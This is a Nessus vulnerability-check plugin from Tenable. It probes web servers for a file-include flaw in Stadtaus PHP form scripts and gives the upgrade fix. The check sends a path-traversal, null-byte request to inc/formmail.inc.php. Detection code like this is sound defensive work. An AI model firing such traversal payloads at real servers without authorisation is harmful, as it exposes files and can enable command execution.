#
# (C) Tenable Network Security
#


if (description) {
  script_id(17285);
  script_version("$Revision: 1.3 $");

  script_bugtraq_id(12735);

  script_name(english:"Stadtaus PHP Scripts File Include Vulnerabilities");

  desc["english"] = "
The remote host is running a PHP script by Ralf Stadtaus that suffers
from a file include vulnerability in inc/formmail.inc.php.  By
leveraging this flaw, an attacker may be able to view arbitrary files
on the remote host and even execute arbitrary commands if PHP is
configured with 'register_globals=on' and 'allow_url_fopen=on'. 

See also : http://www.stadtaus.com/forum/p-5887.html

Solution : Upgrade to a version that corrects the problem (eg, Form
Mail Script v2.4, Tell A Friend Script v2.7, and/or Download Center
Lite v1.6). 

Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Detects file include vulnerabilities in auth.php in Stadtaus' PHP Scripts";
  script_summary(english:summary["english"]);
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security.");

  script_category(ACT_ATTACK);
  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencie("find_service.nes", "http_version.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


foreach dir (make_list(cgi_dirs())) {
  # Try to exploit the form to grab the mail template.
  req = http_get(item:string(dir, "/inc/formmail.inc.php?script_root=../templates/mail.tpl.txt%00"), port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if (res == NULL) exit(0);

  # It's a problem if...
  if (
    # we get the template back or...
    ( 'From: "{firstname} {lastname}" <{email}>' >< res ) ||
    # magic_quotes_gpc=1 prevented us from opening the file.
    (res =~ "<b>Warning</b>:  main\(\.\./templates/mail\.tpl\.txt\\0inc/functions\.inc\.php\)")
  ) {
    security_hole(port);
    exit(0);
  }
}
